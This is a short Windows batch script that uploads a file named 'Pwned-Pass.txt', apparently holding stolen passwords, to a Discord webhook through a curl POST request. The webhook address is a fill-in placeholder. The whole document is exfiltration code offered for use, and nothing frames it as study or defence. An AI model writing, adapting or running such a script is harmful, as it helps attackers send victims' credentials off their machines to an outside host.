@echo off
set WEBHOOK_URL=ADD_DISCORD_WEBHOOK_LINK_HERE
set FILE_PATH=Pwned-Pass.txt

curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%FILE_PATH%" -F "content=Here's the file you requested: %FILE_PATH%" %WEBHOOK_URL%
